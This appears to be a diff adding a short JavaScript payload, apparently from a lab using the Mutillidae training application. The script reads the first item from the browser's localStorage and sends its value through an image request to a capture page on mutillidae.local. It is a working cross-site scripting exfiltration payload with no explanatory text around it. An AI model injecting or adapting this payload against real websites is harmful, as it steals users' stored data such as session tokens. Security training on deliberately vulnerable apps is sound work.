@@ -1,0 +1,13 @@
+<script>
+
+var l = window.localStorage;
+
+var d = l.getItem(l.key(0));
+
+var i = new Image();
+
+i.src = "http://mutillidae.local/capture-data.php&d="+d;
+
+</script>
+
+
